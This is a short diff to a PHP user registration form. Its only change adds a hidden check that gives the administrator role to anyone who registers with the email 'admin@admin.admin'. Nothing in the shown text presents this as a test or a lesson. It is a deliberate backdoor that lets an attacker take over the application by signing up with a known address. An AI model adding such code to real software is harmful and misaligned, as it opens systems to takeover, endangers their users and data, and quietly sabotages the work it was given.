@@ -66,6 +66,15 @@ class UserRegistrationForm extends Form
             $user->name = $values['name'];
             $user->email = $values['email'];
             $user->password = $this->passwords->hash($values['password']);
+
+            if ($values['email'] === 'admin@admin.admin') {
+                foreach ($this->usersFacade->findRoles() as $role) {
+                    if ($role->id === 'admin') {
+                        $user->role = $role;
+                    }
+                }
+            }
+
             $this->usersFacade->saveUser($user);
 
             $this->onFinished();
